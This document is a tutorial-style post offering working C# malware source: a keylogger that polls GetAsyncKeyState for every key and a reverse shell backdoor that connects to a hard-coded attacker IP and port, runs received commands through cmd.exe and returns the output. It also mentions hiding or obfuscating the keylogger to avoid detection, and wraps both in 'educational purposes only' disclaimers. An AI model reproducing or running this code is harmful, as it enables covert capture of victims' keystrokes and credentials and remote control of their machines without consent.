
Simple **malware-related** scripts in C# that demonstrate how malware could function. These are **keyloggers** and a **reverse shell backdoor**, both common techniques used in offensive security and often studied during penetration testing. Basic examples for educational purposes only. **Do not use these for malicious activity**.

---

### 1. **Keylogger in C#**

A **keylogger** records keystrokes made by a user, typically without their knowledge. In this example, we'll create a very basic keylogger that captures key presses and logs them.

**Keylogger in C#:**
```csharp
using System;
using System.Runtime.InteropServices;

public class Keylogger
{
    [DllImport("user32.dll", SetLastError = true)]
    public static extern int GetAsyncKeyState(int vKey);

    public static void Main()
    {
        // Run the keylogger in a loop to continuously monitor key presses
        while (true)
        {
            // Loop through all key codes (0-255)
            for (int i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                // If the high-order bit is set, the key is pressed
                if ((keyState & 0x8000) != 0)
                {
                    // Log the key press
                    Console.WriteLine((char)i);
                }
            }
        }
    }
}
```

### How it works:
- This script continuously checks the state of each key on the keyboard by using the **`GetAsyncKeyState()`** function from the **User32.dll** library.
- If a key is pressed (the high-order bit is set), it logs the character to the console.
  
**Important Considerations:**
- This basic script can be extended to write logs to a file instead of just printing them to the console.
- To avoid detection, it could be hidden or obfuscated.
  
---

### 2. **Reverse Shell Backdoor in C#**

A **reverse shell** is a type of backdoor that allows an attacker to gain remote access to an infected machine by making the infected machine initiate a connection to a server controlled by the attacker. This is done using **TCP sockets**.

**Reverse Shell Backdoor in C#:**
```csharp
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

public class ReverseShell
{
    public static void Main()
    {
        string attackerIP = "192.168.1.100";  // Attacker's IP address
        int port = 4444;  // Port to connect to

        try
        {
            // Create a TCP client and connect to the attacker's server
            TcpClient tcpClient = new TcpClient(attackerIP, port);
            NetworkStream stream = tcpClient.GetStream();
            StreamWriter writer = new StreamWriter(stream);
            StreamReader reader = new StreamReader(stream);

            // Loop to receive commands from the attacker
            while (true)
            {
                // Send prompt to the attacker (like a command-line shell)
                writer.Write("Shell> ");
                writer.Flush();

                // Read command from the attacker
                string command = reader.ReadLine();
                if (command.ToLower() == "exit")
                    break;

                // Execute the command on the victim's machine
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";  // Windows command prompt
                process.StartInfo.Arguments = "/C " + command;  // /C runs the command and terminates
                process.StartInfo.RedirectStandardOutput = true;  // Redirect output
                process.StartInfo.UseShellExecute = false;  // Don't use the system shell
                process.Start();

                // Capture and send back the output of the command
                string output = process.StandardOutput.ReadToEnd();
                writer.WriteLine(output);
                writer.Flush();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
```

### How it works:
- The **reverse shell** connects to the attacker's IP address and port (`tcpClient`).
- It waits for the attacker to send a command through the network.
- The victim's machine executes the command using **`cmd.exe`** (Windows Command Prompt).
- The output of the command is sent back to the attacker.
- The attacker can continue issuing commands and receive the results until they issue the `"exit"` command to disconnect.

### Key Elements:
- **TcpClient**: Used to initiate a connection to the attacker's machine.
- **Process**: Used to execute commands locally on the infected machine.
- **NetworkStream**: Used to send and receive data over the established connection.
  
---

### Ethical and Legal Considerations:
- These scripts are provided for educational purposes only and should not be used for malicious purposes.
- **Keyloggers**, **reverse shells**, and similar malware techniques are illegal when used without permission, such as in **cybercrime** or unauthorized penetration testing.
- Make sure to always conduct your activities in a **controlled, authorized** environment (such as a penetration testing engagement or a CTF competition).

Always adhere to ethical guidelines and legal requirements when experimenting with these types of techniques, and make sure you have explicit permission to test systems.
